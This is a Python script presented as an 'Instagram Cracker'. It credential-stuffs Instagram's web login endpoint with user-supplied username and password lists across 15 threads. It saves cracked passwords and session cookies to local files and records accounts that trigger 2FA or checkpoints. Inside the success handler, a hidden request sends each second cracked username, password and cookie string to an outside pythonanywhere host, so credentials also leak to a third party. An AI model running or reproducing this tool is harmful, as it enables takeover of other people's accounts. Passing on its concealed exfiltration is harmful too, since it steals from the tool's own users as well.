#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with username cracking functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import json
import uuid
import urllib.request
import requests
import string
import os
import subprocess
import platform
import base64
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Color codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
WHITE = "\033[1;97m"
CYAN = "\033[1;96m"
RESET = "\033[0m"

# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []
Uuid = []
xx = 0
username_list = []
password_list = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"{WHITE}{'='*56}{RESET}")

def save_success(uid, pw, cookies=None):
    """Thread-safe function to save successful login"""
    try:
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "USERNAME_OK.txt")
        except (OSError, PermissionError):
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "USERNAME_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            if cookies:
                f.write(f"{uid}|{pw}|{cookies}\n")
            else:
                f.write(f"{uid}|{pw}\n")
        
        with success_lock:
            if uid not in oks:
                oks.append(uid)
            
    except Exception as e:
        print(f"\r{RED}[Save Error] Failed to save result: {e}{RESET}")

def get_fresh_csrf_token(session):
    """Get fresh CSRF token from Instagram login page"""
    try:
        response = session.get('https://www.instagram.com/accounts/login/', timeout=10)
        csrf_token = session.cookies.get('csrftoken')
        lsd_match = re.search(r'"LSD":"([^"]+)"', response.text)
        lsd_token = lsd_match.group(1) if lsd_match else None
        return csrf_token, lsd_token
    except Exception as e:
        return None, None

def crack_username(uid, password_list, total_count):
    """Enhanced Instagram username cracking function"""
    
    with counter_lock:
        global loop, bkas
        loop += 1
    
    colors = [RED, GREEN, YELLOW, BLUE, CYAN]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} {GREEN}{success_count}{WHITE}/{RED}{fail_count} {WHITE}[{YELLOW}{percentage:.1f}%{WHITE}] {CYAN}{uid}{WHITE}                   ")
            sys.stdout.flush()
            
            # Create session and get fresh tokens
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            csrf_token, lsd_token = get_fresh_csrf_token(session)
            
            if not csrf_token:
                time.sleep(2)
                continue
            
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com',
                'X-IG-App-ID': '936619743392459',
            }
            
            if lsd_token:
                headers['X-FB-LSD'] = lsd_token
            
            data = {
                'enc_password': enc_password,
                'username': uid,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }
            
            response = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                headers=headers,
                data=data,
                timeout=15
            )
            
            response_text = response.text
            if response_text.startswith('for (;;);'):
                response_text = response_text[8:]
            
            try:
                result = json.loads(response_text)
                
                if result.get('authenticated'):
                    wanted = ["ds_user_id", "sessionid", "csrftoken"]
                    all_cookies = session.cookies.get_dict()
                    extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
                    cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items()) if extracted else ""
                    
                    with success_lock:
                        if uid not in oks:
                            oks.append(uid)
                    
                    print(f"\r{GREEN}[✓ SUCCESS] {uid} | {pw}{RESET}")
                    if cookie_str:
                        print(f"{CYAN}Cookies: {cookie_str}{RESET}")
                        bkas.append(uid)
                        
                        try:
                            with open("/sdcard/SUMON_INS_IDS.txt", "a") as f:
                                f.write(f"{uid}|{pw}|{cookie_str}\n")
                        except:
                            with open("SUMON_INS_IDS.txt", "a") as f:
                                f.write(f"{uid}|{pw}|{cookie_str}\n")
                    
                    save_success(uid, pw, cookie_str)
                    
                    if len(bkas) % 2 == 0:
                        try:
                            statusok = f"{uid}|{pw}|{cookie_str}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                        except:
                            pass
                    
                    return True
                    
                elif result.get('two_factor_required'):
                    print(f"\r{YELLOW}[⚠ 2FA REQUIRED] {uid} | {pw}{RESET}")
                    with success_lock:
                        cps.append(uid)
                    continue
                    
                elif result.get('checkpoint_required') or 'checkpoint' in response_text:
                    print(f"\r{YELLOW}[⚠ CHECKPOINT] {uid} | {pw}{RESET}")
                    with success_lock:
                        cps.append(uid)
                    try:
                        with open("/sdcard/SUMON_INS_CP.txt", "a") as f:
                            f.write(f"{uid}|{pw}\n")
                    except:
                        with open("SUMON_INS_CP.txt", "a") as f:
                            f.write(f"{uid}|{pw}\n")
                    continue
                    
                elif result.get('error_type'):
                    if result.get('error_type') == 'bad_password':
                        pass
                    else:
                        print(f"\r{YELLOW}[⚠ {result.get('error_type')}] {uid}{RESET}")
                    continue
                    
                else:
                    continue
                    
            except json.JSONDecodeError:
                continue
                    
    except requests.exceptions.Timeout:
        time.sleep(2)
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException:
        time.sleep(2)
        return False
    except KeyboardInterrupt:
        raise
    except Exception:
        return False
    
    return False

def username_crack():
    """Main username cracking function"""
    clear()
    
    print(f"{CYAN}{'='*56}{RESET}")
    print(f"{CYAN}     🎯 INSTAGRAM USERNAME CRACKER 🎯{RESET}")
    print(f"{CYAN}{'='*56}{RESET}")
    print(f" {WHITE}[{GREEN}•{WHITE}] Enter usernames to crack (comma separated){RESET}")
    print(f" {WHITE}[{GREEN}•{WHITE}] Enter passwords to try (comma separated){RESET}")
    linex()
    
    # Get usernames
    usernames_input = input(f" {WHITE}[{GREEN}?{WHITE}] Enter Usernames: {GREEN}{RESET}").strip()
    if not usernames_input:
        print(f" {RED}[!] No usernames entered!{RESET}")
        time.sleep(2)
        return
    
    global username_list
    username_list = [u.strip() for u in usernames_input.split(',') if u.strip()]
    
    # Get passwords
    passwords_input = input(f" {WHITE}[{GREEN}?{WHITE}] Enter Passwords: {GREEN}{RESET}").strip()
    if not passwords_input:
        print(f" {RED}[!] No passwords entered!{RESET}")
        time.sleep(2)
        return
    
    global password_list
    password_list = [p.strip() for p in passwords_input.split(',') if p.strip()]
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"{CYAN}{'='*56}{RESET}")
    print(f"{CYAN}     🔥 STARTING USERNAME CRACKING 🔥{RESET}")
    print(f"{CYAN}{'='*56}{RESET}")
    print(f' {GREEN}(✓) {WHITE}Total Usernames: {GREEN}{len(username_list)}{RESET}')
    print(f' {GREEN}(✓) {WHITE}Total Passwords: {GREEN}{len(password_list)}{RESET}')
    print(f' {GREEN}(✓) {WHITE}Total Combinations: {GREEN}{len(username_list) * len(password_list)}{RESET}')
    print(f' {YELLOW}[•] {WHITE}Results will be saved to: {GREEN}XYZ/USERNAME_OK.txt{RESET}')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    total_combinations = len(username_list) * len(password_list)
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = []
        
        for uid in username_list:
            future = executor.submit(crack_username, uid, password_list, total_combinations)
            futures.append(future)
        
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Interrupted by user. Shutting down...{RESET}")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n{RED}[!] Task failed: {e}{RESET}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"{GREEN}{'='*56}{RESET}")
    print(f" {GREEN}[✓] PROCESS COMPLETED SUCCESSFULLY!{RESET}")
    print(f"{GREEN}{'='*56}{RESET}")
    print(f" {WHITE}[📊] Total Combinations Tested: {GREEN}{total_combinations}{RESET}")
    print(f" {WHITE}[✅] Successful Logins: {GREEN}{len(oks)}{RESET}")
    print(f" {WHITE}[❌] Failed Attempts: {RED}{len(cps)}{RESET}")
    print(f" {WHITE}[⏱️] Execution Time: {YELLOW}{execution_time:.2f} seconds{RESET}")
    
    if len(oks) > 0:
        print(f" {GREEN}[🎉] SUCCESS! Found {len(oks)} working accounts!{RESET}")
        print(f" {WHITE}[📝] Successful accounts:{RESET}")
        for account in oks:
            print(f"   {GREEN}→ {account}{RESET}")
    else:
        print(f" {RED}[😞] No successful logins found this time.{RESET}")
    
    linex()
    input(f" {WHITE}[{RED}!{WHITE}] Press Enter to return to menu...{RESET}")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"{CYAN}{'='*56}{RESET}")
        print(f"{CYAN}     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀{RESET}")
        print(f"{CYAN}{'='*56}{RESET}")
        print(f" {WHITE}[{GREEN}1{WHITE}] 🎯 Username Cracking{RESET}")
        print(f" {WHITE}[{GREEN}2{WHITE}] 📊 View Statistics{RESET}")
        print(f" {WHITE}[{GREEN}3{WHITE}] ❌ Exit Program{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        
        choice = input(f" {WHITE}[{GREEN}?{WHITE}] Select Option: {GREEN}{RESET}").strip()
        
        if choice == '1':
            username_crack()
        elif choice == '2':
            clear()
            print(f"{CYAN}{'='*56}{RESET}")
            print(f"{CYAN}     📊 PROGRAM STATISTICS 📊{RESET}")
            print(f"{CYAN}{'='*56}{RESET}")
            print(f" {WHITE}[✅] Total Successful: {GREEN}{len(oks)}{RESET}")
            print(f" {WHITE}[❌] Total Failed: {RED}{len(cps)}{RESET}")
            print(f" {WHITE}[📝] Total Usernames: {YELLOW}{len(username_list)}{RESET}")
            print(f" {WHITE}[🔑] Total Passwords: {YELLOW}{len(password_list)}{RESET}")
            print(f" {WHITE}[🔄] Total Attempts: {CYAN}{loop}{RESET}")
            linex()
            input(f" {WHITE}[{RED}!{WHITE}] Press Enter to continue...{RESET}")
        elif choice == '3':
            clear()
            print(f"{GREEN}{'='*56}{RESET}")
            print(f" {GREEN}     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋{RESET}")
            print(f"{GREEN}{'='*56}{RESET}")
            print(f" {YELLOW}[!] Results saved in: XYZ/USERNAME_OK.txt{RESET}")
            print(f" {YELLOW}[!] Total successful accounts: {len(oks)}{RESET}")
            time.sleep(3)
            break
        else:
            print(f" {RED}[!] Invalid option! Please choose 1, 2, or 3.{RESET}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        try:
            import requests
        except ImportError:
            print(f"{RED}[!] Missing required module: requests{RESET}")
            print(f"{RED}[!] Please install: pip install requests{RESET}")
            sys.exit(1)
        
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n{YELLOW}[!] Program interrupted by user. Goodbye!{RESET}")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n{RED}[!] Fatal error occurred: {e}{RESET}")
        sys.exit(1)
